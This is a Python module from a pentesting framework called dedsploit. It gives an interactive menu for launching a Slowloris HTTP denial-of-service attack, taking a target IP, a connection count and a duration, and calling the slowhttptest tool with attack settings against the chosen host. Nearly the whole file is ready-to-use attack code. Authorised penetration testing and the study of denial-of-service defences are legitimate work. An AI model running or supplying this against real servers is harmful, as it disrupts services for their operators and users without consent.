"""
http.py

    HTTP pentesting module for dedsploit.

"""

import subprocess

from .. import consts
from ..consts import ColorScheme as col


SLOWLORIS_MENU = [
    ("target <ip>", "Set the target's IP address"),
    ("connections <number>", "Set the number of connections to send"),
    ("length <time>", "Time to keep attack alive"),
    ("start", "Start the attack"),
]


class HTTP(object):
    def __init__(self, command):
        self.command = command

    def slowloris(self):
        while True:
            command = input(col.LP + "[http] slowloris >> " + col.W)
            try:
                tokenized = command.split(" ")
                if tokenized[0] == "target":
                    ip = "http://" + tokenized[1]
                    print("Target IP => ", ip)
                    continue

                elif tokenized[0] == "connections":
                    socket_count = tokenized[1]
                    print("Connections => ", socket_count)
                    continue

                elif tokenized[0] == "length":
                    length = tokenized[1]
                    print("Length => ", length)
                    continue

                elif tokenized[0] == "start":
                    print("Target IP =>", ip, "\nConnections =>", socket_count, "\nLength =>", length)
                    confirm = input(col.LC + "[?] Is the information valid? (y/n) " + col.W)
                    if (confirm == "y") or (confirm == "yes"):
                        subprocess.call(["slowhttptest", "-c", str(socket_count), "-H", "-i 10", "-r 200", "-t GET", "-u", str(ip), "-x 24", "-p 3", "-l", str(length)])
                    continue

                elif tokenized[0] == "exit":
                    break

            except ValueError:
                print(col.WARNING)
                continue
            except KeyboardInterrupt: # Ctrl + C to go back to main menu
                break
            except UnboundLocalError:
                print(col.R + "[!] Parameters were not set before execution! [!]" + col.W)
                continue

    def execute(self):
        if self.command == "slowloris":
            consts.print_command_help(SLOWLORIS_MENU)
            self.slowloris()
